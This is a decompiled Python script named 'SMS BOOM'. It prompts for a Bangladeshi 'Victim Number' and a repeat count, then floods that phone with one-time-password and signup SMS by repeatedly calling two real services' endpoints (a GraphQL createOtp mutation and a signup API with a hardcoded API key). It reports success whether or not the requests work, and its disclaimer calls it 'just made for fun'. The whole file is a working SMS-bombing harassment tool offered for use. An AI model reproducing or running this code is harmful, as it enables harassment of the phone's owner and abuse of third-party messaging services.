# coded by ABIR

# uncompyle6 version 3.7.4

# Python bytecode 2.7

# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 

# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/

# Embedded file name: sumarr

import requests, os, time, sys, smtplib

blue = '\x1b[94m'

lightblue = '\x1b[94m'

red = '\x1b[91m'

white = '\x1b[97m'

green = '\x1b[93m'

green = '\x1b[1;32m'

cyan = '\x1b[96m'

end = '\x1b[0m'

yellow = '\n\n\x1b[1;93m'

os.system('clear')

fuck = red + " \xe2\x9a\xa0\xef\xb8\x8f Warning : It's just made for fun.  We are not responsible if some misuses it."

notice = yellow + '                \xe2\x9c\xaaBangladeshi fuckin bomber\xe2\x9c\xaa                      '

print '\n\x1b[92m TTTTTTTTTTTTTTTTTTTTTTTHHHHHHHHH     HHHHHHHHH      CCCCCCCCCCCCCBBBBBBBBBBBBBBBBB   

T:::::::::::::::::::::TH:::::::H     H:::::::H   CCC::::::::::::CB::::::::::::::::B  

T:::::::::::::::::::::TH:::::::H     H:::::::H CC:::::::::::::::CB::::::BBBBBB:::::B 

T:::::TT:::::::TT:::::THH::::::H     H::::::HHC:::::CCCCCCCC::::CBB:::::B     B:::::B

TTTTTT  T:::::T  TTTTTT  H:::::H     H:::::H C:::::C       CCCCCC  B::::B     B:::::B

        T:::::T          H:::::H     H:::::HC:::::C                B::::B     B:::::B

        T:::::T          H::::::HHHHH::::::HC:::::C                B::::BBBBBB:::::B 

        T:::::T          H:::::::::::::::::HC:::::C                B:::::::::::::BB  

        T:::::T          H:::::::::::::::::HC:::::C                B::::BBBBBB:::::B 

        T:::::T          H::::::HHHHH::::::HC:::::C                B::::B     B:::::B

        T:::::T          H:::::H     H:::::HC:::::C                B::::B     B:::::B

        T:::::T          H:::::H     H:::::H C:::::C       CCCCCC  B::::B     B:::::B

      TT:::::::TT      HH::::::H     H::::::HHC:::::CCCCCCCC::::CBB:::::BBBBBB::::::B

      T:::::::::T      H:::::::H     H:::::::H CC:::::::::::::::CB:::::::::::::::::B 

      T:::::::::T      H:::::::H     H:::::::H   CCC::::::::::::CB::::::::::::::::B  

      TTTTTTTTTTT      HHHHHHHHH     HHHHHHHHH      CCCCCCCCCCCCCBBBBBBBBBBBBBBBBB "
 
print " \n \x1b[92m  "      

def logop(z):

    for word in z + '\n':

        sys.stdout.write(word)

        sys.stdout.flush()

        time.sleep(0.01)

print ''

logop(' \x1b[92m\n|****************************************************| \n| Author   : ABIR                              |\n| Tool     : SMS BOOM                                |\n| Version  : 1.0                                     |\n| Facebook : Abir Hassan                               |\n| Link         |\n| Coded By : ABIR                       |\n******************************************************')

os.system('xdg-oetapen https://www.facebook.com/l0wk3y.ofc/')

print ''

print ''

logop(fuck)

print ''

logop(notice)

print ''

print ''

print ''

print ''

target = raw_input(cyan + ' [\xe2\x9c\x93] Enter your Victim Number              : +880')

amount = int(input(cyan + ' [\xe2\x9c\x93]Choose your Threads Amount (Unlimited) : '))

print ''

print ''

for i in range(amount):

    data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': target, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}

    res = requests.post('https://api-v4-2.hungrynaki.com/graphql', json=data)

    if res.status_code == 200:

        logop(green + '        [\xe2\x9c\x93] Sms Sent Successfully')

    else:

        logop(green + '        [\xe2\x9c\x93] Sms Sent Successfully')

    data = {'requestType': 'send', 

       'phoneNumber': '+880' + target, 

       'emailConsent': 'true', 

       'whatsappConsent': 'true', 

       'email': 'cicas94417@iconmle.com'}

    header = {'x-api-key': 'dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3'}

    url = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'

    res = requests.post(url, json=data, headers=header)

    if res.status_code == 200:

        logop(green + '        [\xe2\x9c\x93] Sms Sent Successfully')

    else:

        logop(green + '        [\xe2\x9c\x93] Sms Sent Successfully')

os.system('xdg-open https://www.facebook.com/l0wk3y.ofc/')

logop(yellow + '        \xe2\x9c\xaa Thanks For Using This Tool \xe2\x9c\xaa ')
